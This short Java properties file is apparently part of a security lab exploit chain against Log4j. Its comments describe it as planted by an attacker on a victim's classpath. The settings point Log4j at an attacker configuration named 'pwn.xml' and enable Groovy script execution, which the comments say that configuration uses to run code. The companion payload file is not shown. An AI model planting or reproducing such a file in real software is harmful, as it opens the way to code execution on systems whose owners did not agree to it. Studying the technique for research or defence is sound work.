# Planted by the attacker on the victim's classpath.
# Log4j (log4j-api) loads this file by name and copies every entry into the JVM
# system properties, silently, during Log4j initialization.
lab.planted=planted-by-attacker

# Point Log4j at the attacker's configuration (classpath resource, loaded as a file).
log4j.configurationFile=pwn.xml
log4j2.configurationFile=pwn.xml

# Turn on script execution, which the attacker's configuration then uses for code execution.
log4j2.Script.enableLanguages=Groovy
